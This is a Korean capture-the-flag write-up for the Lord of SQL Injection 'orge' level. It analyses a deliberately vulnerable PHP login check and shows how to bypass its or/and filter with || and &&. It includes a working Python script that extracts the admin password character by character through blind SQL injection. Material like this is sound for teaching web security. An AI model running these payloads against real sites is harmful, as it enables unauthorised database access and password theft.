# Lord of SQL Injection No.7 - orge

## 문제 출제 의도 

OR, AND를 사용하지 않고 Blind SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```
orge문제의 소스코드이다.
-----
```php
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
```
* preg_match로 "prob","_",".","()"와 or , and를 필터링 해낸다.

```php
$query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
$result = @mysql_fetch_array(mysql_query($query)); 
if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

$_GET[pw] = addslashes($_GET[pw]); 
$query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
$result = @mysql_fetch_array(mysql_query($query)); 
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
```

* guest를 무력화시킨후 admin에 해당하는 pw값을 Blind SQL Injection을 통하여 pw값을 넣어 아래 쿼리에 적용시켜야 한다.

* result['id']의 자리에 0이 아닌 어떤값이 들어가도 해당하는 값에 Hello 와 result['id'] 값이 출력된다.

* GET 메소드로 입력한 pw의 값과 DB에 저장되있는 admin의 pw의 값과 일치할때 문제가 해결된다.

## 문제 해결방안

기존에 orc 문제 해결할 때 이용했던 방법을 이용한다.

우선 문제 풀이자에게 admin에 해당하는 pw의 길이를 출력해주는 쿼리스트링은 위의 쿼리스트링으므로 id='guest'값을 무력화 시켜주어야 한다. 하지만 조건을 걸때 or과 and는 사용하면 안되므로 ||와 &&를 이용한다.

그러므로 …?pw=' || id='admin' && LENGTH(pw)=8# 를 하게되면 정말 행복하게도 pw의 길이가 8이라는 것을 알 수 있다.

그러면 전의 orc때 썻던 python 코드를 수정 활용하면 쉽게 풀린다.

```python
import http.client
result=''
leng=8 # 원래는 0이여야 하지만 pw의 문자열길이가 8임을 알았기에 8
header={'Cookie':' '} #로그인에 이용할 쿠키값
string="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-=+" #pw가 될수있는 값들
'''
for i in range(1,100) :
    length='/orc_47190a4d33f675a601f8def32df2583a.php?pw=%27%20or%20length(pw)='+str(i)+' and%20id=%27admin'
    conn=http.client.HTTPConnection('los.eagle-jump.org')
    conn.request('GET',length,'',header)
    data=conn.getresponse().read()
    if "Hello admin" in data.decode():
        leng = i
        print ("pw length: "+str(i))
        break
        length의 길이를 구하는 for문인데 이미 LENGTH함수로 구했기 떄문에 패스함
'''
for i in range(1,leng+1): # 각 pw의 한자한자를 찾는 for문
    for j in range(0,76): # pw가 될수있는 값들
        substr='/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=%27%20||%20id=%27admin%27%20&&%20substr(pw,'+ str(i) +',1)='+'%27'+ str(string[j]) +'%27'+'and%20id=%27admin' #반복하며 서브스트링을 만들어줌 or 대신 ||, and대신 &&사용했다.
        conn=http.client.HTTPConnection('los.eagle-jump.org') # 보안서버와 통신을 하기위해 사용하는 클래스
        conn.request('GET',substr,'',header) # 연결 성공시 인스턴스 리턴
        data=conn.getresponse().read()
        if 'Hello admin' in data.decode():
            result=result+string[j] # pw값을 만들어줌
            print ('substr(pw,'+str(i)+',1)= '+str(string[j])) # pw값을 하나 출력
            break
print ('Password is '+result) #pw결괏값 출력
```

이렇게 해주면 pw값이 나오고 …?pw=결괏값 하게 되면 아래 쿼리스트링에서 검사되어 문제가 해결된다.